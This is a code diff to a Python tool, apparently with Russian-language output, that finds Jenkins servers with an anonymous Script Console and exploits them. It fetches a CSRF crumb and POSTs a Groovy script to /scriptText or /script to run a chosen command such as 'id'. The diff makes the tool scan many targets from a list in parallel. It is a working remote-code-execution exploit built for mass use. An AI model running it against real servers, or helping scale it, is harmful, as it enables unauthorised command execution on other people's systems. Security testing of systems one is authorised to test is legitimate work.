@@ -6,8 +6,10 @@ import os
 import re
 import ssl
 import sys
+import threading
 import time
 from collections import Counter
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from http.cookiejar import CookieJar
 from urllib.error import HTTPError, URLError
@@ -34,6 +36,13 @@ ENDPOINTS = {
     "pluginManager": "/pluginManager/installed",
     "systemInfo": "/systemInfo",
 }
+PRINT_LOCK = threading.Lock()
+IO_LOCK = threading.Lock()
+
+
+def emit(msg):
+    with PRINT_LOCK:
+        print(msg, flush=True)
 
 
 def normalize(target):
@@ -55,7 +64,7 @@ def opener(with_cookies=False):
     return build_opener(*handlers), jar
 
 
-def fetch(url, timeout=15, op=None, data=None, headers=None):
+def fetch(url, timeout=8, op=None, data=None, headers=None):
     op = op or opener()[0]
     hdrs = {"User-Agent": UA}
     if headers:
@@ -79,17 +88,15 @@ def parse_proof(text):
     return html.unescape(re.sub(r"<[^>]+>", "", text)).strip()[:2000]
 
 
-def check_target(target, cmd="id", timeout=15, prefix=""):
+def check_target(target, cmd="id", timeout=8, prefix=""):
     base = normalize(target)
     started = time.time()
 
     def log(msg):
-        print("%s%s" % (prefix, msg), flush=True)
+        emit("%s%s" % (prefix, msg))
 
     log(base)
-    op, _ = opener()
-    log("  GET / ...")
-    root_code, root_hdr, root_body = fetch(base + "/", timeout, op)
+    root_code, root_hdr, root_body = fetch(base + "/", timeout)
     log("  GET / -> %s" % root_code)
     lower_hdr = {k.lower(): v for k, v in root_hdr.items()}
     version = lower_hdr.get("x-jenkins", "")
@@ -101,12 +108,18 @@ def check_target(target, cmd="id", timeout=15, prefix=""):
 
     codes = {}
     bodies = {}
-    for name, path in ENDPOINTS.items():
-        log("  GET %s ..." % path)
-        code, _, body = fetch(base + path, timeout, op)
-        log("  GET %s -> %s" % (path, code))
-        codes[name] = code
-        bodies[name] = body
+
+    def probe(name, path):
+        code, _, body = fetch(base + path, timeout)
+        return name, code, body
+
+    with ThreadPoolExecutor(max_workers=len(ENDPOINTS)) as ex:
+        futures = [ex.submit(probe, name, path) for name, path in ENDPOINTS.items()]
+        for fut in as_completed(futures):
+            name, code, body = fut.result()
+            codes[name] = code
+            bodies[name] = body
+            log("  GET %s -> %s" % (ENDPOINTS[name], code))
 
     script_anon = bool(re.search(r"name=[\"']script[\"']", bodies["script"], re.I))
     if not script_anon and codes["scriptText"] == 200 and "script" in bodies["scriptText"].lower():
@@ -127,17 +140,14 @@ def check_target(target, cmd="id", timeout=15, prefix=""):
         log("  getting crumb ...")
         fetch(base + "/crumbIssuer/api/json", timeout, cop)
         _, _, crumb_body = fetch(base + "/crumbIssuer/api/json", timeout, cop)
-        log("  crumb=%s" % ("ok" if crumb else "failed"))
         try:
             crumb = json.loads(crumb_body).get("crumb", crumb)
         except (ValueError, AttributeError):
             pass
+        log("  crumb=%s" % ("ok" if crumb else "failed"))
         data = urlencode({"script": GROOVY[cmd], "Submit": "Run"}).encode()
         headers = {"Jenkins-Crumb": crumb, "Content-Type": "application/x-www-form-urlencoded"}
-        if codes["scriptText"] == 200:
-            proof_endpoint = "/scriptText"
-        else:
-            proof_endpoint = "/script"
+        proof_endpoint = "/scriptText" if codes["scriptText"] == 200 else "/script"
         log("  POST %s (%s) ..." % (proof_endpoint, cmd))
         _, _, out = fetch(base + proof_endpoint, timeout, cop, data=data, headers=headers)
         proof = parse_proof(out)
@@ -175,18 +185,20 @@ def write_json(result, out=None):
     if not out:
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
         out = os.path.join(SCANS, "jenkins_rce_%s_%s.json" % (safe_name(result["url"]), ts))
-    with open(out, "w", encoding="utf-8") as f:
-        json.dump(result, f, ensure_ascii=False, indent=2)
+    with IO_LOCK:
+        with open(out, "w", encoding="utf-8") as f:
+            json.dump(result, f, ensure_ascii=False, indent=2)
     return out
 
 
 def main():
-    p = argparse.ArgumentParser(description="Jenkins anonymous Script Console / RCE checker")
+    p = argparse.ArgumentParser(description="Fast parallel Jenkins RCE checker")
     p.add_argument("targets", nargs="*", help="url or host[:port]")
     p.add_argument("-l", "--list", "--file", dest="list_file", help="file with targets, one per line")
     p.add_argument("-c", "--cmd", choices=sorted(GROOVY), default="id")
     p.add_argument("-o", "--output", help="output json (single) or jsonl (batch)")
-    p.add_argument("--timeout", type=int, default=15)
+    p.add_argument("-p", "--parallel", type=int, default=8, help="parallel targets (default 8)")
+    p.add_argument("--timeout", type=int, default=8, help="per-request timeout (default 8s)")
     args = p.parse_args()
 
     targets = list(args.targets)
@@ -212,28 +224,37 @@ def main():
         with open(batch_out, "w", encoding="utf-8"):
             pass
 
-    for i, target in enumerate(targets, 1):
-        prefix = "[%d/%d] " % (i, len(targets)) if batch else ""
-        result = check_target(target, args.cmd, args.timeout, prefix)
-        out = write_json(result, None if batch else args.output)
-        if batch:
-            with open(batch_out, "a", encoding="utf-8") as f:
-                f.write(json.dumps(result, ensure_ascii=False) + "\n")
-            print("%s%s\t%s\t%s" % (prefix, result["verdict"], result["version"] or "-", result["url"]), flush=True)
-        else:
-            print("Отчёт: %s" % out)
-            print("  jenkins=%s  version=%s" % (result["is_jenkins"], result["version"]))
-            print("  script_console_anonymous=%s" % result["anonymous_script_console"])
-            print("  verdict=%s" % result["verdict"])
-            print("  proof=%s" % (result["proof"] or "-"))
+    results = [None] * len(targets)
+    workers = max(1, min(args.parallel, len(targets)))
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futures = {}
+        for i, target in enumerate(targets):
+            prefix = "[%d/%d] " % (i + 1, len(targets)) if batch else ""
+            futures[ex.submit(check_target, target, args.cmd, args.timeout, prefix)] = i
+        for fut in as_completed(futures):
+            i = futures[fut]
+            result = fut.result()
+            results[i] = result
+            out = write_json(result, None if batch else args.output)
+            if batch:
+                with IO_LOCK:
+                    with open(batch_out, "a", encoding="utf-8") as f:
+                        f.write(json.dumps(result, ensure_ascii=False) + "\n")
+            prefix = "[%d/%d] " % (i + 1, len(targets)) if batch else ""
+            emit("%sRESULT %s  %s  version=%s  proof=%s" % (
+                prefix, result["url"], result["verdict"], result["version"] or "-",
+                (result["proof"] or "-")[:60].replace("\n", " ")))
+            if not batch:
+                emit("Отчёт: %s" % out)
 
+    emit("\n=== ИТОГИ ===")
+    for i, r in enumerate(results, 1):
+        emit("%2d. %-30s %-38s %s" % (i, r["url"], r["verdict"], r["version"] or "-"))
     if batch:
-        with open(batch_out, encoding="utf-8") as f:
-            counts = Counter(json.loads(line)["verdict"] for line in f if line.strip())
-        print("\nСводка: %s" % batch_out)
-        print("  целей: %s" % len(targets))
+        emit("\nСводка: %s" % batch_out)
+        counts = Counter(r["verdict"] for r in results)
         for verdict, n in counts.most_common():
-            print("  %s %s" % (n, verdict))
+            emit("  %s %s" % (n, verdict))
     return 0
 
 
